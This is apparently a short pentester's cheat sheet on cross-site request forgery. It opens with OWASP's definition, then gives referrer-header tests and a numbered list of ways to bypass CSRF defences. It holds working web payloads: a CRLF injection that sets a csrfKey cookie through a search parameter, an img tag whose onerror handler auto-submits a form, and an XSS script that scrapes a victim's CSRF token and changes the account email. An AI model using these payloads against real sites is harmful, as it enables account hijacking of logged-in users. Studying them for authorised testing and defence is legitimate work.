# Cross-site request forgery (CSRF)
> Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. - OWASP
## Test first:
Referrer: https://example.com
if:
"Invalid referrer header" so:
```js
Referrer-Policy: unsafe-url
```
else:
"Invalid referrer validation" so:
```html
<meta name="referrer" content="no-referrer">
```
## Then:
1) csrf without csrf protection.
2) csrf validation depends on request method  - Change post to get.
3) csrf delete csrf parameter and value.
4) csrf - drop request and test the token in other session.
5) csrf + crlf - /?search=test%0d%0aSet-Cookie:%20csrfKey=your-key.
```html
<img src="https://domain/?search=test%0d%0aSet-Cookie:%20csrfKey=your-key" onerror="document.forms[0].submit()">
```
6) csrf + xss
```js
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script> 
```


## Referrer:
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection
